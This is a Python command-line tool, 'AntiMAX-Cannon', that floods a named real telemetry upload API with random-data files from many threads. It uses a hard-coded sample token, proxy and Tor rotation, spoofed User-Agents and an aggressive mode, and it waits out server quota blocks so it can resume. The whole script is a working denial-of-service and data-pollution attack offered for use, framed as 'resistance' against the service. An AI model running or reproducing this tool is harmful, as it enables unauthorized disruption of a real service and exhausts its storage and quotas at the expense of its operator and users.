#!/usr/bin/env python3
"""
AntiMAX-Cannon - AppTracer Dump Flooder with QUOTA handling
Usage: python3 antimax_cannon.py [OPTIONS]
"""

import requests
import os
import time
import random
import argparse
import secrets
import json
import threading
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# Конфиг по умолчанию
DEFAULT_SAMPLE_TOKEN = "t6QnlHov0Gq1UBGYG9GPqZu0EiVMZ922FKvwyAEASa90"
DEFAULT_VERSION_NAME = "26.16.0"
DEFAULT_VERSION_CODE = 6698
DEFAULT_FEATURE = "SAMPLED_TRACE"
DEFAULT_INIT_URL = "https://sdk-api.apptracer.ru/api/sample/initUpload"
DEFAULT_UPLOAD_URL = "https://sdk-api.apptracer.ru/api/sample/upload"

# Глобальные счётчики с блокировкой для потоков
stats_lock = threading.Lock()
stats = {
    "init_ok": 0,
    "init_fail": 0,
    "upload_ok": 0,
    "upload_fail": 0,
    "bytes_sent": 0,
    "quota_hits": 0,
    "last_quota_time": 0,
    "start_time": 0
}

# Глобальный флаг квоты (блокировка всех потоков)
quota_blocked = False
quota_block_until = 0

debug_errors = []

def format_bytes(bytes_val):
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if bytes_val < 1024.0:
            return f"{bytes_val:.2f} {unit}"
        bytes_val /= 1024.0
    return f"{bytes_val:.2f} PB"

def format_rate(bytes_per_sec):
    for unit in ['B/s', 'KB/s', 'MB/s', 'GB/s']:
        if bytes_per_sec < 1024.0:
            return f"{bytes_per_sec:.2f} {unit}"
        bytes_per_sec /= 1024.0
    return f"{bytes_per_sec:.2f} GB/s"

def format_time(seconds):
    if seconds < 60:
        return f"{seconds:.0f}s"
    elif seconds < 3600:
        return f"{seconds/60:.1f}m"
    else:
        return f"{seconds/3600:.1f}h"

def print_final_stats():
    elapsed = time.time() - stats["start_time"]
    
    print("\n")
    print("=" * 65)
    print("ANTIMAX-CANNON - FINAL STATISTICS")
    print("=" * 65)
    print(f"  Runtime:           {elapsed:.2f} seconds")
    print(f"  Total Data Sent:   {format_bytes(stats['bytes_sent'])}")
    print(f"  Average Speed:     {format_rate(stats['bytes_sent'] / elapsed if elapsed > 0 else 0)}")
    print("-" * 65)
    print(f"  Init Requests:     {stats['init_ok'] + stats['init_fail']}")
    print(f"    Successful:      {stats['init_ok']}")
    print(f"    Failed:          {stats['init_fail']}")
    print("-" * 65)
    print(f"  Upload Requests:   {stats['upload_ok'] + stats['upload_fail']}")
    print(f"    Successful:      {stats['upload_ok']}")
    print(f"    Failed:          {stats['upload_fail']}")
    print("-" * 65)
    print(f"  QUOTA Hits:        {stats['quota_hits']}")
    if stats['quota_hits'] > 0:
        print(f"  Last QUOTA at:     {datetime.fromtimestamp(stats['last_quota_time']).strftime('%H:%M:%S')}")
    print("=" * 65)
    
    if stats['upload_ok'] > 0:
        print(f"\n🔥 {stats['upload_ok']} garbage files uploaded.")
        print(f"💾 Server accepted {format_bytes(stats['bytes_sent'])} of unreadable noise.")
    
    print("\nAntiMAX-Cannon: Industrial rhythm for industrial resistance.\n")

def parse_args():
    parser = argparse.ArgumentParser(
        description="AntiMAX-Cannon - AppTracer Dump Flooder with QUOTA handling",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 antimax_cannon.py --threads 50 --duration 3600
  python3 antimax_cannon.py --token YOUR_TOKEN --threads 100 --aggressive
  python3 antimax_cannon.py --feature PERFORMANCE_METRICS --size 5000000 --proxy socks5://localhost:9050
        """
    )
    
    parser.add_argument("-t", "--threads", type=int, default=20, help="Threads (default: 20)")
    parser.add_argument("-d", "--duration", type=int, default=0, help="Duration in seconds (0 = infinite)")
    parser.add_argument("-s", "--size", type=int, default=1900000, help="Garbage file size in bytes (default: 1.9MB)")
    parser.add_argument("-i", "--interval", type=float, default=1.0, help="Delay between requests (default: 1.0)")
    
    parser.add_argument("--token", default=DEFAULT_SAMPLE_TOKEN, help="SampleToken for initUpload")
    parser.add_argument("--version-name", default=DEFAULT_VERSION_NAME, help="VersionName (default: 26.16.0)")
    parser.add_argument("--version-code", type=int, default=DEFAULT_VERSION_CODE, help="VersionCode (default: 6698)")
    parser.add_argument("--feature", default=DEFAULT_FEATURE, help="Feature name (default: SAMPLED_TRACE)")
    parser.add_argument("--init-url", default=DEFAULT_INIT_URL, help="InitUpload URL")
    parser.add_argument("--upload-url", default=DEFAULT_UPLOAD_URL, help="Upload URL")
    
    parser.add_argument("--random-ua", action="store_true", help="Random User-Agent")
    parser.add_argument("--ua-file", help="File with User-Agent list (one per line)")
    
    parser.add_argument("--proxy", help="HTTP/SOCKS proxy (e.g., socks5://localhost:9050)")
    parser.add_argument("--proxy-list", help="File with proxy list (rotation)")
    
    parser.add_argument("--aggressive", "-a", action="store_true", help="Aggressive mode (no delays)")
    parser.add_argument("--debug", action="store_true", help="Debug mode - print full responses")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    parser.add_argument("--quiet", "-q", action="store_true", help="Quiet mode (only final stats)")
    parser.add_argument("--stats-interval", type=float, default=1.0, help="Stats update interval (seconds)")
    
    return parser.parse_args()

def load_user_agents(filepath):
    with open(filepath, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def load_proxies(filepath):
    with open(filepath, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def random_user_agent():
    agents = [
        "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.136 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.118 Mobile Safari/537.36",
        "Dalvik/2.1.0 (Linux; U; Android 12; SM-A525F Build/SP1A.210812.016)",
        "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36"
    ]
    return random.choice(agents)

def handle_quota(response_json, args):
    """Обработка квоты — возвращает время ожидания в секундах"""
    global quota_blocked, quota_block_until
    
    if response_json.get("errorCode") == "QUOTA":
        commands = response_json.get("commands", {})
        wait_ms = commands.get("featureShutdownMs", 86400000)  # 24 часа по умолчанию
        wait_sec = wait_ms / 1000
        
        with stats_lock:
            stats["quota_hits"] += 1
            stats["last_quota_time"] = time.time()
        
        quota_blocked = True
        quota_block_until = time.time() + wait_sec
        
        msg = f"\n[!] QUOTA exhausted! Server says: {response_json.get('message', '')}"
        msg += f"\n[!] Blocked for {format_time(wait_sec)} (until {datetime.fromtimestamp(time.time() + wait_sec).strftime('%H:%M:%S')})"
        
        if not args.quiet:
            print(msg)
        
        return wait_sec
    
    return 0

def debug_print(prefix, response, args):
    if not args.debug:
        return
    print(f"\n[DEBUG] {prefix}")
    print(f"  Status: {response.status_code}")
    print(f"  Headers: {dict(response.headers)}")
    try:
        print(f"  Body: {response.json()}")
    except:
        print(f"  Body: {response.text[:500]}")
    print("-" * 40)

def get_upload_token(session, args, proxy_cycle=None, worker_id=0):
    global quota_blocked, quota_block_until
    
    # Если глобальная квота активна — спим
    if quota_blocked:
        remaining = quota_block_until - time.time()
        if remaining > 0:
            time.sleep(min(remaining, 60))
            return None
        else:
            quota_blocked = False
    
    body = {
        "feature": args.feature,
        "versionName": args.version_name,
        "versionCode": args.version_code,
        "sampleSize": args.size,
        "sampleFileName": f"dump_{secrets.token_hex(8)}.pcm"
    }
    
    ua = random_user_agent() if args.random_ua else "AntiMAX-Cannon/1.0"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": ua
    }
    
    proxies = {}
    if proxy_cycle:
        try:
            proxy = next(proxy_cycle)
            proxies = {"http": proxy, "https": proxy}
        except StopIteration:
            pass
    elif args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}
    
    if args.debug:
        print(f"\n[DEBUG W{worker_id}] INIT Request:")
        print(f"  URL: {args.init_url}?sampleToken={args.token[:20]}...")
        print(f"  Body: {json.dumps(body, indent=2)}")
    
    try:
        r = session.post(
            f"{args.init_url}?sampleToken={args.token}",
            json=body,
            headers=headers,
            proxies=proxies if proxies else None,
            timeout=30
        )
        
        if args.debug:
            debug_print(f"INIT Response (W{worker_id})", r, args)
        
        if r.status_code == 200:
            data = r.json()
            token = data.get("uploadToken")
            if token:
                if args.debug:
                    print(f"[DEBUG W{worker_id}] Got uploadToken: {token[:30]}...")
                return token
            else:
                with stats_lock:
                    stats["init_fail"] += 1
                return None
        elif r.status_code == 400:
            data = r.json()
            if data.get("errorCode") == "QUOTA":
                wait_sec = handle_quota(data, args)
                if wait_sec > 0:
                    time.sleep(wait_sec)
                    return get_upload_token(session, args, proxy_cycle, worker_id)
            
            with stats_lock:
                stats["init_fail"] += 1
            if args.debug or args.verbose:
                print(f"\n[W{worker_id}] INIT failed: {r.status_code} - {r.text[:200]}")
            return None
        else:
            with stats_lock:
                stats["init_fail"] += 1
            if args.debug or args.verbose:
                print(f"\n[W{worker_id}] INIT failed: {r.status_code} - {r.text[:200]}")
            return None
    except Exception as e:
        with stats_lock:
            stats["init_fail"] += 1
        error_msg = f"INIT error W{worker_id}: {str(e)}"
        if args.debug:
            print(f"\n[DEBUG] {error_msg}")
            debug_errors.append(error_msg)
        if args.verbose:
            print(f"\n{error_msg}")
        return None

def send_music(session, upload_token, args, proxy_cycle=None, worker_id=0):
    audio_data = os.urandom(args.size)
    files = {"file": ("sample.pcm", audio_data, "application/octet-stream")}
    
    ua = random_user_agent() if args.random_ua else "AntiMAX-Cannon/1.0"
    headers = {"User-Agent": ua}
    
    proxies = {}
    if proxy_cycle:
        try:
            proxy = next(proxy_cycle)
            proxies = {"http": proxy, "https": proxy}
        except StopIteration:
            pass
    elif args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}
    
    if args.debug:
        print(f"\n[DEBUG W{worker_id}] UPLOAD Request:")
        print(f"  URL: {args.upload_url}?uploadToken={upload_token[:20]}...")
        print(f"  Size: {len(audio_data)} bytes")
    
    try:
        r = session.post(
            f"{args.upload_url}?uploadToken={upload_token}",
            files=files,
            headers=headers,
            proxies=proxies if proxies else None,
            timeout=30
        )
        
        if args.debug:
            debug_print(f"UPLOAD Response (W{worker_id})", r, args)
        
        bytes_sent = len(audio_data)
        if r.status_code == 200:
            with stats_lock:
                stats["upload_ok"] += 1
                stats["bytes_sent"] += bytes_sent
            return True, bytes_sent
        else:
            with stats_lock:
                stats["upload_fail"] += 1
            if args.debug or args.verbose:
                print(f"\n[W{worker_id}] UPLOAD failed: {r.status_code} - {r.text[:200]}")
            return False, 0
    except Exception as e:
        with stats_lock:
            stats["upload_fail"] += 1
        error_msg = f"UPLOAD error W{worker_id}: {str(e)}"
        if args.debug:
            print(f"\n[DEBUG] {error_msg}")
            debug_errors.append(error_msg)
        if args.verbose:
            print(f"\n{error_msg}")
        return False, 0

def worker(worker_id, args, stop_flag, proxy_cycle=None):
    session = requests.Session()
    
    while not stop_flag.is_set():
        token = get_upload_token(session, args, proxy_cycle, worker_id)
        if token:
            with stats_lock:
                stats["init_ok"] += 1
            success, _ = send_music(session, token, args, proxy_cycle, worker_id)
            if success and args.verbose:
                print(f"\n[W{worker_id}] +1 [{token[:16]}...]")
        else:
            if args.verbose:
                print(f"\n[W{worker_id}] Token failed")
        
        if not args.aggressive:
            time.sleep(args.interval)

def stats_printer(args, stop_flag):
    last_bytes = 0
    last_time = time.time()
    
    while not stop_flag.is_set():
        time.sleep(args.stats_interval)
        
        if not args.quiet:
            elapsed = time.time() - stats["start_time"]
            current_bytes = stats["bytes_sent"]
            current_time = time.time()
            
            instant_bytes = current_bytes - last_bytes
            instant_time = current_time - last_time
            instant_speed = instant_bytes / instant_time if instant_time > 0 else 0
            
            last_bytes = current_bytes
            last_time = current_time
            
            # Добавляем индикатор квоты
            quota_indicator = ""
            if quota_blocked:
                remaining = quota_block_until - time.time()
                if remaining > 0:
                    quota_indicator = f" | ⚠️ QUOTA: {format_time(remaining)}"
            
            status_line = (
                f"\r[{elapsed:>6.0f}s] "
                f"up: {stats['upload_ok']:>8} | "
                f"data: {format_bytes(current_bytes):>8} | "
                f"speed: {format_rate(instant_speed):>10} | "
                f"ok: {stats['upload_ok']} | fail: {stats['upload_fail']} | "
                f"quota: {stats['quota_hits']}{quota_indicator}    "
            )
            sys.stdout.write(status_line)
            sys.stdout.flush()
    
    print_final_stats()

def print_banner(args):
    banner = f"""
┌─────────────────────────────────────────────────────────────────────────────────────────┐
│  █████╗ ███╗   ██╗████████╗██╗███╗   ███╗ █████╗ ██╗  ██╗                               │
│ ██╔══██╗████╗  ██║╚══██╔══╝██║████╗ ████║██╔══██╗╚██╗██╔╝                               │
│ ███████║██╔██╗ ██║   ██║   ██║██╔████╔██║███████║ ╚███╔╝                                │
│ ██╔══██║██║╚██╗██║   ██║   ██║██║╚██╔╝██║██╔══██║ ██╔██╗                                │
│ ██║  ██║██║ ╚████║   ██║   ██║██║ ╚═╝ ██║██║  ██║██╔╝ ██╗                               │
│ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝                               │
│                                   ██████╗ █████╗ ███╗   ██╗███╗   ██╗ ██████╗ ███╗   ██╗│
│                                  ██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔═══██╗████╗  ██║│
│                                  ██║     ███████║██╔██╗ ██║██╔██╗ ██║██║   ██║██╔██╗ ██║│
│                                  ██║     ██║  ██║██║╚██╗██║██║╚██╗██║██║   ██║██║╚██╗██║│
│                                  ╚██████╗██║  ██║██║ ╚████║██║ ╚████║╚██████╔╝██║ ╚████║│
│                                   ╚═════╝╚═╝  ╚═ ╚═╝  ╚═══╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝│
└─────────────────────────────────────────────────────────────────────────────────────────┘
"""
    if not args.quiet:
        print(banner)

def main():
    args = parse_args()
    
    if not args.quiet:
        print_banner(args)
        print(f"[+] AntiMAX-Cannon v1.0")
        print(f"[+] Target: {args.init_url}")
        print(f"[+] Threads: {args.threads}")
        print(f"[+] Duration: {args.duration if args.duration else 'infinite'}")
        print(f"[+] Size: {format_bytes(args.size)}")
        print(f"[+] Feature: {args.feature}")
        print(f"[+] Aggressive: {args.aggressive}")
        print(f"[+] Proxy: {args.proxy or args.proxy_list or 'None'}")
        print(f"[+] Debug: {args.debug}")
        print(f"[+] Verbose: {args.verbose}")
        print(f"\n[+] Starting AntiMAX barrage... (Ctrl+C to stop)\n")
    
    stop_flag = threading.Event()
    stats["start_time"] = time.time()
    
    stats_thread = threading.Thread(target=stats_printer, args=(args, stop_flag))
    stats_thread.daemon = True
    stats_thread.start()
    
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for i in range(args.threads):
            futures.append(executor.submit(worker, i, args, stop_flag, None))
        
        if args.duration > 0:
            try:
                time.sleep(args.duration)
                stop_flag.set()
            except KeyboardInterrupt:
                stop_flag.set()
        else:
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                stop_flag.set()
        
        for future in as_completed(futures):
            try:
                future.result()
            except:
                pass
    
    stop_flag.set()
    time.sleep(0.5)
    print_final_stats()

if __name__ == "__main__":
    main()
